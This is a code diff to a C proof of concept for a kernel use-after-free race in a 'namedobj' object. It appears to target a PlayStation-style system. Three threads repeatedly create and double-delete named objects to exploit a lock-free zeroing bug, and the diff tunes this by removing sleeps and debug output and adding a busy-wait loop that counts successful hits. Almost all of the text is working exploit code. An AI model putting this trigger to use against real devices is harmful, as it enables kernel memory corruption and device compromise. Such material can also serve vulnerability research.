@@ -26,8 +26,7 @@ void* thread_delete_a(void* arg) {
         int h = g_handle;
         if (h == -1) continue;
         g_handle = -1;
-        int r = namedobj_delete(h, NAMEDOBJ_FLAGS);
-        printf_debug("A: h=0x%x r=%d\n", h, r);
+        namedobj_delete(h, NAMEDOBJ_FLAGS);
     }
     return NULL;
 }
@@ -49,23 +48,10 @@ void* thread_delete_b(void* arg) {
 void* thread_create(void* arg) {
     printf_debug("thread_C start\n");
     while (g_running) {
-
-        // أنشئ object جديد مباشرة
         int h = namedobj_create("poc_uaf", 0, NAMEDOBJ_FLAGS);
-
-        if (h <= 0) {
-            //sceKernelUsleep(100);
-            continue;
-        }
-
+        if (h <= 0) continue;
         g_count++;
-        printf_debug("C: create #%d h=0x%x\n", g_count, h);
-
-        // ضع الـ handle مباشرة — thread_A سيأخذه
         g_handle = h;
-
-        // sleep قصير فقط لإعطاء thread_A فرصة
-        //sceKernelUsleep(10);
     }
     return NULL;
 }
@@ -83,13 +69,25 @@ int _main(struct thread *td) {
     ScePthread tA, tB, tC;
 
     printf_debug("=== namedobj UAF PoC ===\n");
-    printf_debug("Bug: entry[0x10] zeroed outside lock\n\n");
 
-    scePthreadCreate(&tC, NULL, thread_create,    NULL, "creator");
-    scePthreadCreate(&tA, NULL, thread_delete_a,  NULL, "deleter_a");
-    scePthreadCreate(&tB, NULL, thread_delete_b,  NULL, "deleter_b");
+    scePthreadCreate(&tC, NULL, thread_create,   NULL, "creator");
+    scePthreadCreate(&tA, NULL, thread_delete_a, NULL, "deleter_a");
+    scePthreadCreate(&tB, NULL, thread_delete_b, NULL, "deleter_b");
 
-    //sceKernelSleep(30);
+    // انتظار بدون freeze وبدون usleep
+    int seconds = 0;
+    while (seconds < 30 && g_running) {
+        int i = 0;
+        // busy wait لمدة ثانية تقريباً
+        while (i < 100000000 && g_running) {
+            i++;
+        }
+        seconds++;
+        printf_debug("t=%ds creates=%d hits=%d\n",
+                     seconds, g_count, g_hits);
+        if (g_hits > 0) break;
+    }
+
     g_running = 0;
 
     scePthreadJoin(tA, NULL);
